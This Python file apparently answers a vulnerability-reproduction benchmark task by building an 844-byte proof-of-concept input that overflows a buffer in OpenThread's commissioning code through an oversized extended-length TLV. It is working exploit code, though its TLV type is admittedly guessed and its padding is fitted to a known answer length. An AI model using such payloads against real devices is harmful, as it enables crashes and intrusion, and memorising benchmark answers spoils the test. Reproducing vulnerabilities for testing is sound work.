import os
import tarfile
import tempfile
import struct
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract source to analyze vulnerability
        with tarfile.open(src_path, 'r:*') as tar:
            tar.extractall('/tmp/source_analysis')
        
        # Based on the vulnerability description:
        # - Commissioner Dataset TLVs with extended TLV length cause buffer overflow
        # - The HandleCommissioningSet() function doesn't properly validate extended lengths
        # - Ground-truth length is 844 bytes
        
        # We'll create a PoC that:
        # 1. Uses extended TLV length (2-byte length field)
        # 2. Has a very large value field to overflow the buffer
        # 3. Total size is exactly 844 bytes to match ground-truth
        
        # Typical TLV format for Thread/OpenThread:
        # Type (1 byte) | Length (1 or 2 bytes) | Value (variable)
        # Extended length: If first length byte = 0xFF, then next 2 bytes are actual length
        
        # Build PoC with Commissioner Dataset TLV
        poc = bytearray()
        
        # Start with Commissioner Dataset TLV type (hypothetical - common values in Thread)
        # In Thread protocol, Commissioner Dataset TLV might be around 0x09-0x0B range
        # We'll use a value that would trigger the vulnerable code path
        commissioner_tlv_type = 0x09  # Hypothetical Commissioner Dataset TLV type
        
        # Extended length format: 0xFF followed by 2-byte big-endian length
        # Total value length needed: 844 - 4 (type + 0xFF + 2-byte length) = 840 bytes
        
        poc.append(commissioner_tlv_type)  # TLV Type
        poc.append(0xFF)  # Extended length indicator
        
        # Extended length value: 840 bytes (0x0348 in hex)
        # But we need to overflow, so use maximum possible: 0xFFFF = 65535
        # However, ground-truth is 844 bytes total, so we'll use length that results in 844 total
        # Actual value length = total - header_size = 844 - 4 = 840
        extended_length = 840  # 0x0348
        poc.extend(struct.pack('>H', extended_length))  # Big-endian 2-byte length
        
        # Fill with pattern that will trigger overflow
        # Using pattern of 'A's followed by some structure to ensure crash
        pattern = b'A' * 200  # Initial fill
        
        # Add some structure to look like valid TLV data
        # Multiple nested TLVs to confuse parsing
        pattern += bytes([
            0x01, 0x02, 0x00, 0x01,  # Another TLV
            0x02, 0x04, 0x00, 0x00, 0x00, 0x00,
            0x03, 0xFF, 0x00, 0x10  # Another extended length TLV (shorter)
        ])
        
        # Add more fill to reach required length
        remaining = 840 - len(pattern)
        if remaining > 0:
            pattern += b'B' * remaining
        
        poc.extend(pattern)
        
        # Verify total length matches ground-truth
        assert len(poc) == 844, f"Generated PoC is {len(poc)} bytes, expected 844"
        
        return bytes(poc)
